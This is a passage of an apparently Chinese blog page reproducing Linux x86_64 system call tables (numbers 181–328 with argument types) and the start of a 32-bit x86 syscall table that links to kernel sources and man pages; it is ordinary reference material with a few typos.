IMPLEMENTED</td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>181</td><td>sys_getpmsg</td><td>NOT IMPLEMENTED</td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>182</td><td>sys_putpmsg</td><td>NOT IMPLEMENTED</td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>183</td><td>sys_afs_syscall</td><td>NOT IMPLEMENTED</td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>184</td><td>sys_tuxcall</td><td>NOT IMPLEMENTED</td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>185</td><td>sys_security</td><td>NOT IMPLEMENTED</td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>186</td><td>sys_gettid</td><td></td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>187</td><td>sys_readahead</td><td>int fd</td><td>loff_t offset</td><td>size_t count</td><td></td><td></td><td></td></tr><tr><td>188</td><td>sys_setxattr</td><td>const char *pathname</td><td>const char *name</td><td>const void *value</td><td>size_t size</td><td>int flags</td><td></td></tr><tr><td>189</td><td>sys_lsetxattr</td><td>const char *pathname</td><td>const char *name</td><td>const void *value</td><td>size_t size</td><td>int flags</td><td></td></tr><tr><td>190</td><td>sys_fsetxattr</td><td>int fd</td><td>const char *name</td><td>const void *value</td><td>size_t size</td><td>int flags</td><td></td></tr><tr><td>191</td><td>sys_getxattr</td><td>const char *pathname</td><td>const char *name</td><td>void *value</td><td>size_t size</td><td></td><td></td></tr><tr><td>192</td><td>sys_lgetxattr</td><td>const char *pathname</td><td>const char *name</td><td>void *value</td><td>size_t size</td><td></td><td></td></tr><tr><td>193</td><td>sys_fgetxattr</td><td>int fd</td><td>const har *name</td><td>void *value</td><td>size_t size</td><td></td><td></td></tr><tr><td>194</td><td>sys_listxattr</td><td>const char *pathname</td><td>char *list</td><td>size_t size</td><td></td><td></td><td></td></tr><tr><td>195</td><td>sys_llistxattr</td><td>const char *pathname</td><td>char *list</td><td>size_t size</td><td></td><td></td><td></td></tr><tr><td>196</td><td>sys_flistxattr</td><td>int fd</td><td>char *list</td><td>size_t size</td><td></td><td></td><td></td></tr><tr><td>197</td><td>sys_removexattr</td><td>const char *pathname</td><td>const char *name</td><td></td><td></td><td></td><td></td></tr><tr><td>198</td><td>sys_lremovexattr</td><td>const char *pathname</td><td>const char *name</td><td></td><td></td><td></td><td></td></tr><tr><td>199</td><td>sys_fremovexattr</td><td>int fd</td><td>const char *name</td><td></td><td></td><td></td><td></td></tr><tr><td>200</td><td>sys_tkill</td><td>pid_t pid</td><td>ing sig</td><td></td><td></td><td></td><td></td></tr><tr><td>201</td><td>sys_time</td><td>time_t *tloc</td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>202</td><td>sys_futex</td><td>u32 *uaddr</td><td>int op</td><td>u32 val</td><td>struct timespec *utime</td><td>u32 *uaddr2</td><td>u32 val3</td></tr><tr><td>203</td><td>sys_sched_setaffinity</td><td>pid_t pid</td><td>unsigned int len</td><td>unsigned long *user_mask_ptr</td><td></td><td></td><td></td></tr><tr><td>204</td><td>sys_sched_getaffinity</td><td>pid_t pid</td><td>unsigned int len</td><td>unsigned long *user_mask_ptr</td><td></td><td></td><td></td></tr><tr><td>205</td><td>sys_set_thread_area</td><td>NOT IMPLEMENTED. Use arch_prctl</td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>206</td><td>sys_io_setup</td><td>unsigned nr_events</td><td>aio_context_t *ctxp</td><td></td><td></td><td></td><td></td></tr><tr><td>207</td><td>sys_io_destroy</td><td>aio_context_t ctx</td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>208</td><td>sys_io_getevents</td><td>aio_context_t ctx_id</td><td>long min_nr</td><td>long nr</td><td>struct io_event *events</td><td></td><td></td></tr><tr><td>209</td><td>sys_io_submit</td><td>aio_context_t ctx_id</td><td>long nr</td><td>struct iocb **iocbpp</td><td></td><td></td><td></td></tr><tr><td>210</td><td>sys_io_cancel</td><td>aio_context_t ctx_id</td><td>struct iocb *iocb</td><td>struct io_event *result</td><td></td><td></td><td></td></tr><tr><td>211</td><td>sys_get_thread_area</td><td>NOT IMPLEMENTED. Use arch_prctl</td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>212</td><td>sys_lookup_dcookie</td><td>u64 cookie64</td><td>long buf</td><td>long len</td><td></td><td></td><td></td></tr><tr><td>213</td><td>sys_epoll_create</td><td>int size</td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>214</td><td>sys_epoll_ctl_old</td><td>NOT IMPLEMENTED</td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>215</td><td>sys_epoll_wait_old</td><td>NOT IMPLEMENTED</td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>216</td><td>sys_remap_file_pages</td><td>unsigned long start</td><td>unsigned long size</td><td>unsigned long prot</td><td>unsigned long pgoff</td><td>unsigned long flags</td><td></td></tr><tr><td>217</td><td>sys_getdents64</td><td>unsigned int fd</td><td>struct linux_dirent64 *dirent</td><td>unsigned int count</td><td></td><td></td><td></td></tr><tr><td>218</td><td>sys_set_tid_address</td><td>int *tidptr</td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>219</td><td>sys_restart_syscall</td><td></td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>220</td><td>sys_semtimedop</td><td>int semid</td><td>struct sembuf *tsops</td><td>unsigned nsops</td><td>const struct timespec *timeout</td><td></td><td></td></tr><tr><td>221</td><td>sys_fadvise64</td><td>int fd</td><td>loff_t offset</td><td>size_t len</td><td>int advice</td><td></td><td></td></tr><tr><td>222</td><td>sys_timer_create</td><td>const clockid_t which_clock</td><td>struct sigevent *timer_event_spec</td><td>timer_t *created_timer_id</td><td></td><td></td><td></td></tr><tr><td>223</td><td>sys_timer_settime</td><td>timer_t timer_id</td><td>int flags</td><td>const struct itimerspec *new_setting</td><td>struct itimerspec *old_setting</td><td></td><td></td></tr><tr><td>224</td><td>sys_timer_gettime</td><td>timer_t timer_id</td><td>struct itimerspec *setting</td><td></td><td></td><td></td><td></td></tr><tr><td>225</td><td>sys_timer_getoverrun</td><td>timer_t timer_id</td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>226</td><td>sys_timer_delete</td><td>timer_t timer_id</td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>227</td><td>sys_clock_settime</td><td>const clockid_t which_clock</td><td>const struct timespec *tp</td><td></td><td></td><td></td><td></td></tr><tr><td>228</td><td>sys_clock_gettime</td><td>const clockid_t which_clock</td><td>struct timespec *tp</td><td></td><td></td><td></td><td></td></tr><tr><td>229</td><td>sys_clock_getres</td><td>const clockid_t which_clock</td><td>struct timespec *tp</td><td></td><td></td><td></td><td></td></tr><tr><td>230</td><td>sys_clock_nanosleep</td><td>const clockid_t which_clock</td><td>int flags</td><td>const struct timespec *rqtp</td><td>struct timespec *rmtp</td><td></td><td></td></tr><tr><td>231</td><td>sys_exit_group</td><td>int error_code</td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>232</td><td>sys_epoll_wait</td><td>int epfd</td><td>struct epoll_event *events</td><td>int maxevents</td><td>int timeout</td><td></td><td></td></tr><tr><td>233</td><td>sys_epoll_ctl</td><td>int epfd</td><td>int op</td><td>int fd</td><td>struct epoll_event *event</td><td></td><td></td></tr><tr><td>234</td><td>sys_tgkill</td><td>pid_t tgid</td><td>pid_t pid</td><td>int sig</td><td></td><td></td><td></td></tr><tr><td>235</td><td>sys_utimes</td><td>char *filename</td><td>struct timeval *utimes</td><td></td><td></td><td></td><td></td></tr><tr><td>236</td><td>sys_vserver</td><td>NOT IMPLEMENTED</td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>237</td><td>sys_mbind</td><td>unsigned long start</td><td>unsigned long len</td><td>unsigned long mode</td><td>unsigned long *nmask</td><td>unsigned long maxnode</td><td>unsigned flags</td></tr><tr><td>238</td><td>sys_set_mempolicy</td><td>int mode</td><td>unsigned long *nmask</td><td>unsigned long maxnode</td><td></td><td></td><td></td></tr><tr><td>239</td><td>sys_get_mempolicy</td><td>int *policy</td><td>unsigned long *nmask</td><td>unsigned long maxnode</td><td>unsigned long addr</td><td>unsigned long flags</td><td></td></tr><tr><td>240</td><td>sys_mq_open</td><td>const char *u_name</td><td>int oflag</td><td>mode_t mode</td><td>struct mq_attr *u_attr</td><td></td><td></td></tr><tr><td>241</td><td>sys_mq_unlink</td><td>const char *u_name</td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>242</td><td>sys_mq_timedsend</td><td>mqd_t mqdes</td><td>const char *u_msg_ptr</td><td>size_t msg_len</td><td>unsigned int msg_prio</td><td>const stuct timespec *u_abs_timeout</td><td></td></tr><tr><td>243</td><td>sys_mq_timedreceive</td><td>mqd_t mqdes</td><td>char *u_msg_ptr</td><td>size_t msg_len</td><td>unsigned int *u_msg_prio</td><td>const struct timespec *u_abs_timeout</td><td></td></tr><tr><td>244</td><td>sys_mq_notify</td><td>mqd_t mqdes</td><td>const struct sigevent *u_notification</td><td></td><td></td><td></td><td></td></tr><tr><td>245</td><td>sys_mq_getsetattr</td><td>mqd_t mqdes</td><td>const struct mq_attr *u_mqstat</td><td>struct mq_attr *u_omqstat</td><td></td><td></td><td></td></tr><tr><td>246</td><td>sys_kexec_load</td><td>unsigned long entry</td><td>unsigned long nr_segments</td><td>struct kexec_segment *segments</td><td>unsigned long flags</td><td></td><td></td></tr><tr><td>247</td><td>sys_waitid</td><td>int which</td><td>pid_t upid</td><td>struct siginfo *infop</td><td>int options</td><td>struct rusage *ru</td><td></td></tr><tr><td>248</td><td>sys_add_key</td><td>const char *_type</td><td>const char *_description</td><td>const void *_payload</td><td>size_t plen</td><td></td><td></td></tr><tr><td>249</td><td>sys_request_key</td><td>const char *_type</td><td>const char *_description</td><td>const char *_callout_info</td><td>key_serial_t destringid</td><td></td><td></td></tr><tr><td>250</td><td>sys_keyctl</td><td>int option</td><td>unsigned long arg2</td><td>unsigned long arg3</td><td>unsigned long arg4</td><td>unsigned long arg5</td><td></td></tr><tr><td>251</td><td>sys_ioprio_set</td><td>int which</td><td>int who</td><td>int ioprio</td><td></td><td></td><td></td></tr><tr><td>252</td><td>sys_ioprio_get</td><td>int which</td><td>int who</td><td></td><td></td><td></td><td></td></tr><tr><td>253</td><td>sys_inotify_init</td><td></td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>254</td><td>sys_inotify_add_watch</td><td>int fd</td><td>const char *pathname</td><td>u32 mask</td><td></td><td></td><td></td></tr><tr><td>255</td><td>sys_inotify_rm_watch</td><td>int fd</td><td>__s32 wd</td><td></td><td></td><td></td><td></td></tr><tr><td>256</td><td>sys_migrate_pages</td><td>pid_t pid</td><td>unsigned long maxnode</td><td>const unsigned long *old_nodes</td><td>const unsigned long *new_nodes</td><td></td><td></td></tr><tr><td>257</td><td>sys_openat</td><td>int dfd</td><td>const char *filename</td><td>int flags</td><td>int mode</td><td></td><td></td></tr><tr><td>258</td><td>sys_mkdirat</td><td>int dfd</td><td>const char *pathname</td><td>int mode</td><td></td><td></td><td></td></tr><tr><td>259</td><td>sys_mknodat</td><td>int dfd</td><td>const char *filename</td><td>int mode</td><td>unsigned dev</td><td></td><td></td></tr><tr><td>260</td><td>sys_fchownat</td><td>int dfd</td><td>const char *filename</td><td>uid_t user</td><td>gid_t group</td><td>int flag</td><td></td></tr><tr><td>261</td><td>sys_futimesat</td><td>int dfd</td><td>const char *filename</td><td>struct timeval *utimes</td><td></td><td></td><td></td></tr><tr><td>262</td><td>sys_newfstatat</td><td>int dfd</td><td>const char *filename</td><td>struct stat *statbuf</td><td>int flag</td><td></td><td></td></tr><tr><td>263</td><td>sys_unlinkat</td><td>int dfd</td><td>const char *pathname</td><td>int flag</td><td></td><td></td><td></td></tr><tr><td>264</td><td>sys_renameat</td><td>int oldfd</td><td>const char *oldname</td><td>int newfd</td><td>const char *newname</td><td></td><td></td></tr><tr><td>265</td><td>sys_linkat</td><td>int oldfd</td><td>const char *oldname</td><td>int newfd</td><td>const char *newname</td><td>int flags</td><td></td></tr><tr><td>266</td><td>sys_symlinkat</td><td>const char *oldname</td><td>int newfd</td><td>const char *newname</td><td></td><td></td><td></td></tr><tr><td>267</td><td>sys_readlinkat</td><td>int dfd</td><td>const char *pathname</td><td>char *buf</td><td>int bufsiz</td><td></td><td></td></tr><tr><td>268</td><td>sys_fchmodat</td><td>int dfd</td><td>const char *filename</td><td>mode_t mode</td><td></td><td></td><td></td></tr><tr><td>269</td><td>sys_faccessat</td><td>int dfd</td><td>const char *filename</td><td>int mode</td><td></td><td></td><td></td></tr><tr><td>270</td><td>sys_pselect6</td><td>int n</td><td>fd_set *inp</td><td>fd_set *outp</td><td>fd_set *exp</td><td>struct timespec *tsp</td><td>void *sig</td></tr><tr><td>271</td><td>sys_ppoll</td><td>struct pollfd *ufds</td><td>unsigned int nfds</td><td>struct timespec *tsp</td><td>const sigset_t *sigmask</td><td>size_t sigsetsize</td><td></td></tr><tr><td>272</td><td>sys_unshare</td><td>unsigned long unshare_flags</td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>273</td><td>sys_set_robust_list</td><td>struct robust_list_head *head</td><td>size_t len</td><td></td><td></td><td></td><td></td></tr><tr><td>274</td><td>sys_get_robust_list</td><td>int pid</td><td>struct robust_list_head **head_ptr</td><td>size_t *len_ptr</td><td></td><td></td><td></td></tr><tr><td>275</td><td>sys_splice</td><td>int fd_in</td><td>loff_t *off_in</td><td>int fd_out</td><td>loff_t *off_out</td><td>size_t len</td><td>unsigned int flags</td></tr><tr><td>276</td><td>sys_tee</td><td>int fdin</td><td>int fdout</td><td>size_t len</td><td>unsigned int flags</td><td></td><td></td></tr><tr><td>277</td><td>sys_sync_file_range</td><td>long fd</td><td>loff_t offset</td><td>loff_t bytes</td><td>long flags</td><td></td><td></td></tr><tr><td>278</td><td>sys_vmsplice</td><td>int fd</td><td>const struct iovec *iov</td><td>unsigned long nr_segs</td><td>unsigned int flags</td><td></td><td></td></tr><tr><td>279</td><td>sys_move_pages</td><td>pid_t pid</td><td>unsigned long nr_pages</td><td>const void **pages</td><td>const int *nodes</td><td>int *status</td><td>int flags</td></tr><tr><td>280</td><td>sys_utimensat</td><td>int dfd</td><td>const char *filename</td><td>struct timespec *utimes</td><td>int flags</td><td></td><td></td></tr><tr><td>281</td><td>sys_epoll_pwait</td><td>int epfd</td><td>struct epoll_event *events</td><td>int maxevents</td><td>int timeout</td><td>const sigset_t *sigmask</td><td>size_t sigsetsize</td></tr><tr><td>282</td><td>sys_signalfd</td><td>int ufd</td><td>sigset_t *user_mask</td><td>size_t sizemask</td><td></td><td></td><td></td></tr><tr><td>283</td><td>sys_timerfd_create</td><td>int clockid</td><td>int flags</td><td></td><td></td><td></td><td></td></tr><tr><td>284</td><td>sys_eventfd</td><td>unsigned int count</td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>285</td><td>sys_fallocate</td><td>long fd</td><td>long mode</td><td>loff_t offset</td><td>loff_t len</td><td></td><td></td></tr><tr><td>286</td><td>sys_timerfd_settime</td><td>int ufd</td><td>int flags</td><td>const struct itimerspec *utmr</td><td>struct itimerspec *otmr</td><td></td><td></td></tr><tr><td>287</td><td>sys_timerfd_gettime</td><td>int ufd</td><td>struct itimerspec *otmr</td><td></td><td></td><td></td><td></td></tr><tr><td>288</td><td>sys_accept4</td><td>int fd</td><td>struct sockaddr *upeer_sockaddr</td><td>int *upeer_addrlen</td><td>int flags</td><td></td><td></td></tr><tr><td>289</td><td>sys_signalfd4</td><td>int ufd</td><td>sigset_t *user_mask</td><td>size_t sizemask</td><td>int flags</td><td></td><td></td></tr><tr><td>290</td><td>sys_eventfd2</td><td>unsigned int count</td><td>int flags</td><td></td><td></td><td></td><td></td></tr><tr><td>291</td><td>sys_epoll_create1</td><td>int flags</td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>292</td><td>sys_dup3</td><td>unsigned int oldfd</td><td>unsigned int newfd</td><td>int flags</td><td></td><td></td><td></td></tr><tr><td>293</td><td>sys_pipe2</td><td>int *filedes</td><td>int flags</td><td></td><td></td><td></td><td></td></tr><tr><td>294</td><td>sys_inotify_init1</td><td>int flags</td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>295</td><td>sys_preadv</td><td>unsigned long fd</td><td>const struct iovec *vec</td><td>unsigned long vlen</td><td>unsigned long pos_l</td><td>unsigned long pos_h</td><td></td></tr><tr><td>296</td><td>sys_pwritev</td><td>unsigned long fd</td><td>const struct iovec *vec</td><td>unsigned long vlen</td><td>unsigned long pos_l</td><td>unsigned long pos_h</td><td></td></tr><tr><td>297</td><td>sys_rt_tgsigqueueinfo</td><td>pid_t tgid</td><td>pid_t pid</td><td>int sig</td><td>siginfo_t *uinfo</td><td></td><td></td></tr><tr><td>298</td><td>sys_perf_event_open</td><td>struct perf_event_attr *attr_uptr</td><td>pid_t pid</td><td>int cpu</td><td>int group_fd</td><td>unsigned long flags</td><td></td></tr><tr><td>299</td><td>sys_recvmmsg</td><td>int fd</td><td>struct msghdr *mmsg</td><td>unsigned int vlen</td><td>unsigned int flags</td><td>struct timespec *timeout</td><td></td></tr><tr><td>300</td><td>sys_fanotify_init</td><td>unsigned int flags</td><td>unsigned int event_f_flags</td><td></td><td></td><td></td><td></td></tr><tr><td>301</td><td>sys_fanotify_mark</td><td>long fanotify_fd</td><td>long flags</td><td>__u64 mask</td><td>long dfd</td><td>long pathname</td><td></td></tr><tr><td>302</td><td>sys_prlimit64</td><td>pid_t pid</td><td>unsigned int resource</td><td>const struct rlimit64 *new_rlim</td><td>struct rlimit64 *old_rlim</td><td></td><td></td></tr><tr><td>303</td><td>sys_name_to_handle_at</td><td>int dfd</td><td>const char *name</td><td>struct file_handle *handle</td><td>int *mnt_id</td><td>int flag</td><td></td></tr><tr><td>304</td><td>sys_open_by_handle_at</td><td>int dfd</td><td>const char *name</td><td>struct file_handle *handle</td><td>int *mnt_id</td><td>int flags</td><td></td></tr><tr><td>305</td><td>sys_clock_adjtime</td><td>clockid_t which_clock</td><td>struct timex *tx</td><td></td><td></td><td></td><td></td></tr><tr><td>306</td><td>sys_syncfs</td><td>int fd</td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>307</td><td>sys_sendmmsg</td><td>int fd</td><td>struct mmsghdr *mmsg</td><td>unsigned int vlen</td><td>unsigned int flags</td><td></td><td></td></tr><tr><td>308</td><td>sys_setns</td><td>int fd</td><td>int nstype</td><td></td><td></td><td></td><td></td></tr><tr><td>309</td><td>sys_getcpu</td><td>unsigned *cpup</td><td>unsigned *nodep</td><td>struct getcpu_cache *unused</td><td></td><td></td><td></td></tr><tr><td>310</td><td>sys_process_vm_readv</td><td>pid_t pid</td><td>const struct iovec *lvec</td><td>unsigned long liovcnt</td><td>const struct iovec *rvec</td><td>unsigned long riovcnt</td><td>unsigned long flags</td></tr><tr><td>311</td><td>sys_process_vm_writev</td><td>pid_t pid</td><td>const struct iovec *lvec</td><td>unsigned long liovcnt</td><td>const struct iovcc *rvec</td><td>unsigned long riovcnt</td><td>unsigned long flags</td></tr><tr><td>312</td><td>sys_kcmp</td><td>pid_t pid1</td><td>pid_t pid2</td><td>int type</td><td>unsigned long idx1</td><td>unsigned long idx2</td><td></td></tr><tr><td>313</td><td>sys_finit_module</td><td>int fd</td><td>const char __user *uargs</td><td>int flags</td><td></td><td></td><td></td></tr><tr><td>314</td><td>sys_sched_setattr</td><td>pid_t pid</td><td>struct sched_attr __user *attr</td><td>unsigned int flags</td><td></td><td></td><td></td></tr><tr><td>315</td><td>sys_sched_getattr</td><td>pid_t pid</td><td>struct sched_attr __user *attr</td><td>unsigned int size</td><td>unsigned int flags</td><td></td><td></td></tr><tr><td>316</td><td>sys_renameat2</td><td>int olddfd</td><td>const char __user *oldname</td><td>int newdfd</td><td>const char __user *newname</td><td>unsigned int flags</td><td></td></tr><tr><td>317</td><td>sys_seccomp</td><td>unsigned int op</td><td>unsigned int flags</td><td>const char __user *uargs</td><td></td><td></td><td></td></tr><tr><td>318</td><td>sys_getrandom</td><td>char __user *buf</td><td>size_t count</td><td>unsigned int flags</td><td></td><td></td><td></td></tr><tr><td>319</td><td>sys_memfd_create</td><td>const char __user *uname_ptr</td><td>unsigned int flags</td><td></td><td></td><td></td><td></td></tr><tr><td>320</td><td>sys_kexec_file_load</td><td>int kernel_fd</td><td>int initrd_fd</td><td>unsigned long cmdline_len</td><td>const char __user *cmdline_ptr</td><td>unsigned long flags</td><td></td></tr><tr><td>321</td><td>sys_bpf</td><td>int cmd</td><td>union bpf_attr *attr</td><td>unsigned int size</td><td></td><td></td><td></td></tr><tr><td>322</td><td>stub_execveat</td><td>int dfd</td><td>const char __user *filename</td><td>const char <strong>user *const</strong> user *argv</td><td>const char <strong>user *const</strong> user *envp</td><td>int flags</td><td></td></tr><tr><td>323</td><td>userfaultfd</td><td>int flags</td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>324</td><td>membarrier</td><td>int cmd</td><td>int flags</td><td></td><td></td><td></td><td></td></tr><tr><td>325</td><td>mlock2</td><td>unsigned long start</td><td>size_t len</td><td>int flags</td><td></td><td></td><td></td></tr><tr><td>326</td><td>copy_file_range</td><td>int fd_in</td><td>loff_t __user *off_in</td><td>int fd_out</td><td>loff_t __user * off_out</td><td>size_t len</td><td>unsigned int flags</td></tr><tr><td>327</td><td>preadv2</td><td>unsigned long fd</td><td>const struct iovec __user *vec</td><td>unsigned long vlen</td><td>unsigned long pos_l</td><td>unsigned long pos_h</td><td>int flags</td></tr><tr><td>328</td><td>pwritev2</td><td>unsigned long fd</td><td>const struct iovec __user *vec</td><td>unsigned long vlen</td><td>unsigned long pos_l</td><td>unsigned long pos_h</td><td>int flags</td></tr></tbody></table><h1 id="x86-system-call"><a href="#x86-system-call" class="headerlink" title="x86_system_call:"></a>x86_system_call:</h1><p>原表地址 : <a href="https://www.informatik.htw-dresden.de/~beck/ASM/syscall_list.html" target="_blank" rel="noopener">https://www.informatik.htw-dresden.de/~beck/ASM/syscall_list.html</a></p><table><thead><tr><th>%eax</th><th>Name</th><th>Source</th><th>%ebx</th><th>%ecx</th><th>%edx</th><th>%esx</th><th>%edi</th></tr></thead><tbody><tr><td>1</td><td><a href="https://www.informatik.htw-dresden.de/~beck/ASM/man/exit.2.html" target="_blank" rel="noopener">sys_exit</a></td><td><a href="https://www.informatik.htw-dresden.de/~beck/ASM/src/kernel/exit.c" target="_blank" rel="noopener">kernel/exit.c</a></td><td>int</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td>2</td><td><a href="https://www.informatik.htw-dresden.de/~beck/ASM/man/fork.2.html" target="_blank" rel="noopener">sys_fork</a></td><td><a href="https://www.informatik.htw-dresden.de/~beck/ASM/src/arch/i386/kernel/process.c" target="_blank" rel="noopener">arch/i386/kernel/process.c</a></td><td><a href="https://www.informatik.htw-dresden.de/~beck/ASM/syscall_list.html#pt_regs" target="_blank" rel="noopener">struct pt_regs</a></td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td>3</td><td><a href="https://www.informatik.htw-dresden.de/~beck/ASM/man/read.2.html" target="_blank" rel="noopener">sys_read</a></td><td><a href="https://www.informatik.htw-dresden.de/~beck/ASM/src/fs/read_write.c" target="_blank" rel="noopener">fs/read_write.c</a></td><td>unsigned int</td><td>char *</td><td><a href="https://www.informatik.htw-dresden.de/~beck/ASM/syscall_list.html#size_t" target="_blank" rel="noopener">size_t</a></td><td>-</td><td>-</td></tr><tr><td>4</td><td><a href="https://www.informatik.htw-dresden.de/~beck/ASM/man/write.2.html" target="_blank" rel="noopener">sys_write</a></td><td><a href="https://www.informatik.htw-dresden.de/~beck/ASM/src/fs/read_write.c" target="_blank" rel="noopener">fs/read_write.c</a></td><td>unsigned int</td><td>const char *</td><td><a href="https://www.informatik.htw-dresden.de/~beck/ASM/syscall_list.html#size_t" target="_blank" rel="noopener">size_t</a></td><td>-</td><td>-</td></tr><tr><td>5</td><td><a href="https://www.informatik.htw-dresden.de/~beck/ASM/man/open.2.html" target="_blank" rel="noopener">sys_open</a></td><td><a href="https://www.informatik.htw-dresden.de/~beck/ASM/src/fs/open.c" target="_blank" rel="noopener">fs/open.c</a></td><td>const char *</td><td>int</td><td>int</td><td>-</td><td>-</td></tr><tr><td>6</td><td><a href="https://www.informatik.htw-dresden.de/~beck/ASM/man/close.2.html" target="_blank" rel="noopener">sys_close</a></td><td><a href="https://www.informatik.htw-dresden.de/~beck/ASM/src/fs/open.c" target="_blank" rel="noopener">fs/open.c</a></td><td>unsigned int</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td>7</td><td><a href="https://www.informatik.htw-dresden.de/~beck/ASM/man/waitpid.2.html" target="_blank" rel="noopener">sys_waitpid</a></td><td><a href="https://www.informatik.htw-dresden.de/~beck/ASM/src/kernel/exit.c" target="_blank" rel="noopener">kernel/exit.c</a></td><td>pid_t</td><td>unsigned int *</td><td>int</td><td>-</td><td>-</td></tr><tr><td>8</td><td><a href="https://www.informatik.htw-dresden.de/~beck/ASM/man/creat.2.html" target="_blank" rel="noopener">sys_creat</a></td><td><a href="https://www.informatik.htw-dresden.de/~beck/ASM/src/fs/open.c" target="_blank" rel="noopener">fs/open.c</a></td><td>const char *</td><td>int</td><td>-</td><td>-</td><td>-</td></tr><tr><td>9</td><td><a href="https://www.informatik.htw-dresden.de/~beck/ASM/man/link.2.html" target="_blank" rel="noopener">sys_link</a></td><td><a href="https://www.informatik.htw-dresden.de/~beck/ASM/src/fs/namei.c" target="_blank" rel="noopener">fs/namei.c</a></td><td>const char *</td><td>const char *</td><td>-</td><td>-</td><td>-</td></tr><tr><td>10</td><td><a href="https://www.informatik.htw-dresden.de/~beck/ASM/man/unlink.2.html" target="_blank" rel="noopener">sys_unlink</a></td><td><a href="https://www.informatik.htw-dresden.de/~beck/ASM/src/fs/namei.c" target="_blank" rel="noopener">fs/namei.c</a></td><td>const char *</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td>11</td><td><a href="https://www.informatik.htw-dresden.de/~beck/ASM/man/execve.2.html" target="_blank" rel="noopener">sys_execve</a></td><td><a href="https://www.informatik.htw-dresden.de/~beck/ASM/src/arch/i386/kernel/process.c" target="_blank" rel="noopener">arch/i386/kernel/process.c</a></td><td><a href="https://www.informatik.htw-dresden.de/~beck/ASM/syscall_list.html#pt_regs" target="_blank" rel="noopener">struct pt_regs</a></td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td>12</td><td><a href="https://www.informatik.htw-dresden.de/~beck/ASM/man/chdir.2.html" target="_blank" rel="noopener">sys_chdir</a></td><td><a href="https://www.informatik.htw-dresden.de/~beck/ASM/src/fs/open.c" target="_blank" rel="noopener">fs/open.c</a></td><td>const char *</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td>13</td><td><a href="https://www.informatik.htw-dresden.de/~beck/ASM/man/time.2.html" target="_blank" rel="noopener">sys_time</a></td><td><a href="https://www.informatik.htw-dresden.de/~beck/ASM/src/kernel/time.c" target="_blank" rel="noopener">kernel/time.c</a></td><td>int *</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td>14</td><td><a href="https://www.informatik.htw-dresden.de/~beck/ASM/man/mknod.2.html" target="_blank" rel="noopener">sys_mknod</a></td><td><a href="https://www.informatik.htw-dresden.de/~beck/ASM/src/fs/namei.c" target="_blank" rel="noopener">fs/namei.c</a></td><td>const char *</td><td>int</td><td><a href="https://www.informatik.htw-dresden.de/~beck/ASM/syscall_list.html#dev_t" target="_blank" rel="noopener">dev_t</a></td><td>-</td><td>-</td></tr><tr><td>15</td><td><a href="https://www.informatik.htw-dresden.de/~beck/ASM/man/chmod.2.html" target="_blank" rel="noopener">sys_chmod</a></td><td><a href="https://www.informatik.htw-dresden.de/~beck/ASM/src/fs/open.c" target="_blank" rel="noopener">fs/open.c</a></td><td>const char *</td><td><a href="https://www.informatik.htw-dresden.de/~beck/ASM/syscall_list.html#mode_t" target="_blank" rel="noopener">mode_t</a></td><td>-</td><td>-</td><td>-</td></tr><tr><td>16</td><td><a href="https://www.informatik.htw-dresden.de/~beck/ASM/man/lchown.2.html" target="_blank" rel="noopener">sys_lchown</a></td><td><a href="https://www.informatik.htw-dresden.de/~beck/ASM/src/fs/open.c" target="_blank" rel="noopener">fs/open.c</a></td><td>const char *</td><td><a href="https://www.informatik.htw-dresden.de/~beck/ASM/syscall_list.html#uid_t" target="_blank" rel="noopener">uid_t</a></td><td><a href="https://www.informatik.htw-dresden.de/~beck/ASM/syscall_list.html#gid_t" target="_blank" rel="noopener">gid_t</a></td><td>-</td><td>-</td></tr><tr><td>18</td><td><a href="https://www.informatik.htw-dresden.de/~beck/ASM/man/stat.2.html" target="_blank" rel="noopener">sys_stat</a></td><td><a href="https://www.informatik.htw-dresden.de/~beck/ASM/src/fs/stat.c" target="_blank" rel="noopener">fs/stat.c</a></td><td>char *</td><td><a href="https://www.informatik.htw-dresden.de/~beck/ASM/syscall_list.html#__old_kernel_stat" target="_blank" rel="noopener">struct __old_kernel_stat *</a></td><td>-</td><td>-</td><td>-</td></tr><tr><td>19</td><td><a href="https://www.informatik.htw-dresden.de/~beck/ASM/man/lseek.2.html" target="_blank" rel="noopener">sys_lseek</a></td><td><a href="https://www.informatik.htw-dresden.de/~beck/ASM/src/fs/read_write.c" target="_blank" rel="noopener">fs/read_write.c</a></td><td>unsigned int</td><td><a href="https://www.informatik.htw-dresden.de/~beck/ASM/syscall_list.html#off_t" target="_blank" rel="noopener">off_t</a></td><td>unsigned int</td><td>-</td><td>-</td></tr><tr><td>20</td><td><a href="https://www.informatik.htw-dresden.de/~beck/ASM/man/getpid.2.html" target="_blank" rel="noopener">sys_getpid</a></td><td><a 